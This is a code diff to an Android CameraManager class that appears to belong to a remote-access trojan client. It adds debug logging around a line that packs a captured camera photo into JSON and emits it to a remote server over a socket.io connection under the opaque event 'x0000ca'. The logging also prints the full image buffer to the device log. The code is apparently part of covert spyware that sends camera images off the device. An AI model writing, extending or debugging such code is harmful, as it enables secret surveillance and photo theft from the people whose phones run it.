@@ -7,6 +7,7 @@ import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
 import android.hardware.Camera;
 import android.hardware.Camera.PictureCallback;
+import android.util.Log;
 
 
 import org.json.JSONArray;
@@ -51,11 +52,14 @@ public class CameraManager {
             JSONObject object = new JSONObject();
             object.put("image",true);
             object.put("buffer" , bos.toByteArray());
-            IOSocket.getInstance().getIoSocket().emit("x0000ca" , object);
 
+            Log.w("lalo", "SendPhoto: " + object);
+
+            IOSocket.getInstance().getIoSocket().emit("x0000ca" , object);
 
         } catch (JSONException e) {
             e.printStackTrace();
+            Log.w("lalo", "Error SendPhoto: " + e.getMessage());
         }
 
     }
